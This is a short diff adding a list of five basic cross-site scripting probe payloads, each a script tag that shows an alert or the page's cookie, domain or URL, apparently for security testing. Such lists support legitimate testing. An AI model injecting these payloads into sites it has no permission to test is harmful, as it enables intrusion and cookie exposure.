@@ -1,0 +1,5 @@
+<script>alert('XSS Found!')</script>
+<script>alert("XSS Found!")</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.URL)</script>
